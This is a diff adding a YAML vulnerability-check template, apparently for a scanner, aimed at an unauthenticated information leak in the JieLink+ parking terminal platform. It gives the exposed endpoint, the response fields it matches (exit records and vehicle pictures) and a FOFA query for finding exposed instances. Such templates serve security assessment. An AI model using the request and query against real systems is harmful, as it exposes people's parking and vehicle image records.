@@ -1,0 +1,16 @@
+id: poc-yaml-jielink-plus-parkoutrecord-info-leak
+info:
+  name: JieLink+智能终端操作平台 ParkOutRecord 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: JeLink+
+  fofa: title="JieLink+智能终端操作平台"
+requests:
+- method: GET
+  path: /report/ParkOutRecord/GetDataList
+  expression: "status_code == 200 && \ncontains(body,\"\\\"OutRecordID\\\":\") &&\n\
+    contains(body,\"\\\"EnterDeviceName\\\":\") &&\ncontains(body,\"\\\"OutPicture\\\
+    \":\") &&\ncontains(body,\"\\\"EnterPicture\\\":\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
